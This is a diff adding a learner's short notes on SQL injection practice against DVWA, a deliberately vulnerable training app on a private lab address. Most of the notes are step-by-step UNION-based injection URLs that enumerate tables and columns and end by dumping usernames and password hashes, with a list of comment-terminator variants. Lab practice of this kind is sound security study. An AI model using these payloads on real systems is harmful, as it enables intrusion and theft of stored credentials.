@@ -1,0 +1,44 @@
+day21  SQL
+terminal >> cd /var/www/html/DVWA-2.4/vulnerabilities/sqli/source
+terminal >> subl low.php
+echo $query;
+
+For SQL Injection Exploit
+
+sql testing input for identify
+'
+"
+\
+back tap
+
+Step 1. Fix the error with comments
+192.168.0.142/DVWA-2.4/vulnerabilities/sqli/?id=3'-- -&Submit=Submit#
+Step 2. Find the Column count with order by query => 2 
+192.168.0.142/DVWA-2.4/vulnerabilities/sqli/?id=3' order by 2-- -&Submit=Submit#
+Step 3. Find the vuln column with union query => 1,2
+192.168.0.142/DVWA-2.4/vulnerabilities/sqli/?id=-3' union select 1111111,2222222-- -&Submit=Submit#
+Step 4. Select database name or version
+192.168.0.142/DVWA-2.4/vulnerabilities/sqli/?id=-3' union select database(),version()-- -&Submit=Submit#
+Step 5. Select tables name from database;
+192.168.0.142/DVWA-2.4/vulnerabilities/sqli/?id=-3' union select group_concat(table_name),2 from information_schema.tables where table_schema=database()-- -&Submit=Submit#
+Step 6. Select Column name from table users
+192.168.0.142/DVWA-2.4/vulnerabilities/sqli/?id=-3' union select group_concat(column_name),2 from information_schema.columns where table_schema=database() and table_name='users'-- -&Submit=Submit#
+Step 7. Dump data from Columns
+192.168.0.142/DVWA-2.4/vulnerabilities/sqli/?id=-3' union select group_concat('<br/>',user,0x3a3a,password),2 from users-- -&Submit=Submit#
+
+
+Comments
+--
+--+
+-- -
+%23
+#
+back tap
+%60
+
+====================================================
+Union Base
+	-String
+	-Integer
+Error Base
+Blind Base
